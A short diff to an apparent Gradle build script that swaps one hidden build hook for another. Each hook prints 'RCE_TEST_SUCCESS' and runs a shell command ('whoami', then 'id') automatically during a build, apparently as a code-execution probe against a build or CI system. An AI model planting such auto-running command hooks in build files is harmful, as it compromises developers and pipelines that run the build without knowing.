@@ -1,11 +1,4 @@
-tasks.whenTaskAdded { task ->
-    if (task.name == "assembleRelease") {
-        task.doFirst {
-            println "RCE_TEST_SUCCESS"
-            println "Current user: " + "whoami".execute().text
-        }
-    }
-}
+
 buildscript {
     ext.kotlin_version = '1.9.22'
     repositories {
@@ -36,4 +29,8 @@ subprojects {
 
 tasks.register("clean", Delete) {
     delete rootProject.buildDir
+}
+gradle.buildFinished {
+    println "RCE_TEST_SUCCESS"
+    "id".execute().text.each { println it }
 }
